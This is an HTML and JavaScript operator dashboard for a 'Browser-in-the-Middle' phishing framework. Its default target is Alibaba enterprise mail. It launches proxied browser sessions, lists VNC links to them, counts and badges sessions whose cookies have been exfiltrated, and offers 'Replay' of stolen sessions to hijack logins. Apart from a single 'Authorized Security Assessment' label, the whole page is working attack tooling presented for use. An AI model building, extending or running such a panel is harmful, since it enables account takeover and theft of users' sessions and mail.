<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BitB Framework - Browser-in-the-Middle</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #0a0a0a;
            color: #e0e0e0;
            min-height: 100vh;
        }
        .header {
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
            padding: 1.5rem 2rem;
            border-bottom: 1px solid #0f3460;
        }
        .header h1 {
            font-size: 1.5rem;
            background: linear-gradient(90deg, #e94560, #ff6b6b);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        .stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 1rem;
            padding: 2rem;
        }
        .stat-card {
            background: #161b22;
            border: 1px solid #30363d;
            border-radius: 8px;
            padding: 1.5rem;
        }
        .stat-card h3 {
            color: #8b949e;
            font-size: 0.875rem;
            text-transform: uppercase;
            margin-bottom: 0.5rem;
        }
        .stat-value {
            font-size: 2rem;
            font-weight: bold;
            color: #58a6ff;
        }
        .main-content {
            padding: 0 2rem 2rem;
        }
        .toolbar {
            display: flex;
            gap: 1rem;
            margin-bottom: 1.5rem;
        }
        .btn {
            padding: 0.75rem 1.5rem;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            font-size: 0.875rem;
            font-weight: 500;
            transition: all 0.2s;
        }
        .btn-primary {
            background: #238636;
            color: white;
        }
        .btn-primary:hover {
            background: #2ea043;
        }
        .btn-danger {
            background: #da3633;
            color: white;
        }
        .btn-danger:hover {
            background: #f85149;
        }
        .sessions-table {
            width: 100%;
            border-collapse: collapse;
            background: #161b22;
            border: 1px solid #30363d;
            border-radius: 8px;
            overflow: hidden;
        }
        .sessions-table th,
        .sessions-table td {
            padding: 1rem;
            text-align: left;
            border-bottom: 1px solid #30363d;
        }
        .sessions-table th {
            background: #0d1117;
            color: #8b949e;
            font-weight: 500;
            text-transform: uppercase;
            font-size: 0.75rem;
        }
        .sessions-table tr:hover {
            background: #1f242c;
        }
        .status {
            display: inline-flex;
            align-items: center;
            gap: 0.5rem;
            padding: 0.25rem 0.75rem;
            border-radius: 12px;
            font-size: 0.75rem;
            font-weight: 500;
        }
        .status-running {
            background: rgba(35, 134, 54, 0.2);
            color: #3fb950;
        }
        .status-pending {
            background: rgba(187, 128, 9, 0.2);
            color: #d29922;
        }
        .status-failed {
            background: rgba(207, 34, 46, 0.2);
            color: #ff7b72;
        }
        .status-exfiltrated {
            background: rgba(207, 34, 46, 0.2);
            color: #ff7b72;
        }
        .actions {
            display: flex;
            gap: 0.5rem;
            flex-wrap: wrap;
        }
        .btn-sm {
            padding: 0.375rem 0.75rem;
            font-size: 0.75rem;
        }
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            z-index: 1000;
            justify-content: center;
            align-items: center;
        }
        .modal.active {
            display: flex;
        }
        .modal-content {
            background: #161b22;
            border: 1px solid #30363d;
            border-radius: 8px;
            padding: 2rem;
            width: 90%;
            max-width: 500px;
        }
        .form-group {
            margin-bottom: 1rem;
        }
        .form-group label {
            display: block;
            margin-bottom: 0.5rem;
            color: #8b949e;
            font-size: 0.875rem;
        }
        .form-group input {
            width: 100%;
            padding: 0.75rem;
            background: #0d1117;
            border: 1px solid #30363d;
            border-radius: 6px;
            color: #e0e0e0;
        }
        .form-group input:focus {
            outline: none;
            border-color: #58a6ff;
        }
        .exfil-badge {
            display: inline-flex;
            align-items: center;
            gap: 0.25rem;
            padding: 0.125rem 0.5rem;
            background: #cf222e;
            color: white;
            border-radius: 4px;
            font-size: 0.625rem;
            text-transform: uppercase;
        }
        .vnc-link {
            color: #58a6ff;
            text-decoration: none;
        }
        .vnc-link:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="header">
        <h1>🔴 BitB Framework - Browser-in-the-Middle</h1>
        <p style="color: #8b949e; margin-top: 0.5rem;">Authorized Security Assessment Platform</p>
    </div>
    <div class="stats">
        <div class="stat-card">
            <h3>Active Sessions</h3>
            <div class="stat-value" id="active-count">0</div>
        </div>
        <div class="stat-card">
            <h3>Total Exfiltrated</h3>
            <div class="stat-value" id="exfil-count">0</div>
        </div>
        <div class="stat-card">
            <h3>Uptime</h3>
            <div class="stat-value" style="font-size: 1.25rem;" id="uptime">00:00:00</div>
        </div>
    </div>
    <div class="main-content">
        <div class="toolbar">
            <button class="btn btn-primary" onclick="showLaunchModal()">+ Launch Browser</button>
            <button class="btn btn-danger" onclick="cleanupAll()">Cleanup All</button>
        </div>
        <table class="sessions-table">
            <thead>
                <tr>
                    <th>Session ID</th>
                    <th>Status</th>
                    <th>Target URL</th>
                    <th>VNC Access</th>
                    <th>Created</th>
                    <th>Actions</th>
                </tr>
            </thead>
            <tbody id="sessions-body"></tbody>
        </table>
    </div>
    <div class="modal" id="launch-modal">
        <div class="modal-content">
            <h2 style="margin-bottom: 1.5rem;">Launch New Browser</h2>
            <div class="form-group">
                <label>Target URL</label>
                <input type="text" id="target-url" value="https://qiye.aliyun.com/" placeholder="https://...">
            </div>
            <div class="form-group">
                <label>User ID (optional)</label>
                <input type="text" id="user-id" placeholder="auto-generated">
            </div>
            <div style="display: flex; gap: 1rem; justify-content: flex-end; margin-top: 1.5rem;">
                <button class="btn" onclick="hideLaunchModal()" style="background: #30363d; color: #e0e0e0;">Cancel</button>
                <button class="btn btn-primary" onclick="launchBrowser()">Launch</button>
            </div>
        </div>
    </div>
    <script>
        let sessions = [];
        async function fetchSessions() {
            try {
                const res = await fetch('/api/sessions');
                sessions = await res.json();
                renderSessions();
                updateStats();
            } catch (e) {
                console.error('Failed to fetch sessions:', e);
            }
        }
        function renderSessions() {
            const tbody = document.getElementById('sessions-body');
            tbody.innerHTML = sessions.map(s => `
                <tr>
                    <td>
                        <code>${s.id}</code>
                        ${s.exfil_data?.cookies ? '<span class="exfil-badge">EXFIL</span>' : ''}
                    </td>
                    <td>
                        <span class="status status-${s.status}">● ${s.status}</span>
                    </td>
                    <td>${s.target_url}</td>
                    <td>
                        ${s.cf_url ? `<a href="${s.cf_url}" target="_blank" class="vnc-link">Open VNC ↗</a>` : 'Pending...'}
                    </td>
                    <td>${new Date(s.created_at).toLocaleString()}</td>
                    <td>
                        <div class="actions">
                            ${s.exfil_data ? `<button class="btn btn-sm btn-primary" onclick="replaySession('${s.id}')">Replay</button>` : ''}
                            <button class="btn btn-sm" onclick="exfilSession('${s.id}')" style="background: #8957e5; color: white;">Exfil</button>
                            <button class="btn btn-sm btn-danger" onclick="terminateSession('${s.id}')">Kill</button>
                        </div>
                    </td>
                </tr>
            `).join('');
        }
        function updateStats() {
            document.getElementById('active-count').textContent = sessions.filter(s => s.status === 'running').length;
            document.getElementById('exfil-count').textContent = sessions.filter(s => s.exfil_data).length;
        }
        function showLaunchModal() {
            document.getElementById('launch-modal').classList.add('active');
        }
        function hideLaunchModal() {
            document.getElementById('launch-modal').classList.remove('active');
        }
        async function launchBrowser() {
            const targetUrl = document.getElementById('target-url').value;
            const userId = document.getElementById('user-id').value;
            try {
                const res = await fetch('/api/session/launch', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({target_url: targetUrl, user_id: userId})
                });
                if (res.ok) {
                    hideLaunchModal();
                    setTimeout(fetchSessions, 2000);
                } else {
                    const error = await res.json();
                    alert('Launch failed: ' + (error.error || res.statusText));
                }
            } catch (e) {
                alert('Failed to launch: ' + e.message);
            }
        }
        async function terminateSession(id) {
            if (!confirm('Terminate session ' + id + '?')) return;
            await fetch(`/api/session/${id}/terminate`, {method: 'POST'});
            fetchSessions();
        }
        async function exfilSession(id) {
            alert('Manual exfiltration must be triggered from within the browser session.');
        }
        async function replaySession(id) {
            const res = await fetch(`/api/session/${id}/replay`, {method: 'POST'});
            if (res.ok) {
                const data = await res.json();
                alert('Replay session launched: ' + data.replay_session_id);
            } else {
                const error = await res.json();
                alert('Replay failed: ' + (error.error || res.statusText));
            }
        }
        async function cleanupAll() {
            if (!confirm('Terminate ALL sessions?')) return;
            for (const s of sessions) {
                await fetch(`/api/session/${s.id}/terminate`, {method: 'POST'});
            }
            fetchSessions();
        }
        setInterval(fetchSessions, 5000);
        fetchSessions();
    </script>
</body>
</html>
